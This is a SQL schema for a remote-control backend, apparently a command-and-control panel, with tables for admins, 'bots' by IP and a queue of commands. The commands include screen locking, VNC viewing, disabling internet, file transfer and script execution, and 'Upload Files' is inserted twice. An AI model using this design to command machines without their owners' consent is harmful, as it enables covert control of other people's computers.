drop table if exists admins;
create table admins (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  name STRING NOT NULL,
  password CHAR(40) NOT NULL
);

drop table if exists bots;
create table bots (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  ip STRING NOT NULL,
  alias STRING DEFAULT NULL
);

drop table if exists commands;
create table commands (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  name STRING NOT NULL
);

insert into commands (name) VALUES ('Lock Screen');
insert into commands (name) VALUES ('Unlock Screen');
insert into commands (name) VALUES ('Connect to VNC Screencast');
insert into commands (name) VALUES ('Disconnect to VNC Screencast');
insert into commands (name) VALUES ('Disable Internet');
insert into commands (name) VALUES ('Download Files');
insert into commands (name) VALUES ('Upload Files');
insert into commands (name) VALUES ('Shutdown');
insert into commands (name) VALUES ('Upload Files');
insert into commands (name) VALUES ('Execute Script');


drop table if exists bot_command_queue;
create table bot_command_queue (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  bot_id INTEGER NOT NULL,
  command_id INTEGER NOT NULL,
  received BOOLEAN NOT NULL DEFAULT FALSE,
  FOREIGN KEY(bot_id) REFERENCES bots(id),
  FOREIGN KEY(command_id) REFERENCES commands(id)
);
